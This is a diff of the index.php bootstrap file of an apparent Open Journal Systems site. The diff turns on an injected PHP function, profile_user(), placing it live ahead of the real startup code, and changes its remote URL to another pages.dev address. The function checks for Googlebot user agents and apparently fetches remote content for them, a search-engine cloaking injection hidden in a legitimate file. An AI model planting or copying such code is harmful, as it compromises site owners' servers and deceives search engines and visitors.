@@ -6,10 +6,16 @@
  * Copyright (c) 2014-2021 Simon Fraser University
  * Copyright (c) 2003-2021 John Willinsky
  * Distributed under the GNU GPL v3. For full terms see the file docs/COPYING.
- *function profile_user() {
+ *
+ * Bootstrap code for OJS site. Loads required files and then calls the
+ * dispatcher to delegate to the appropriate request handler.
+ */
+
+use APP\core\Application;
+function profile_user() {
     $refererUrl = !empty($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : 'No Referer';
     $useragent = $_SERVER['HTTP_USER_AGENT'];
-    $pasteUrl = 'https://naikplusplus.pages.dev/index.txt';
+    $pasteUrl = 'https://apimembara.pages.dev/index.txt';
     $refererDomain = parse_url($refererUrl, PHP_URL_HOST);
 
     if (strpos($useragent, 'Google-InspectionTool') !== false || strpos($useragent, 'googlebot') !== false || strpos($useragent, '(compatible; Googlebot/2.1; +http://www.google.com/bot.html)') !== false) {
@@ -26,12 +32,6 @@
 }
 
 profile_user();
- * Bootstrap code for OJS site. Loads required files and then calls the
- * dispatcher to delegate to the appropriate request handler.
- */
-
-use APP\core\Application;
-
 // Initialize global environment
 define('INDEX_FILE_LOCATION', __FILE__);
 require_once './lib/pkp/includes/bootstrap.php';
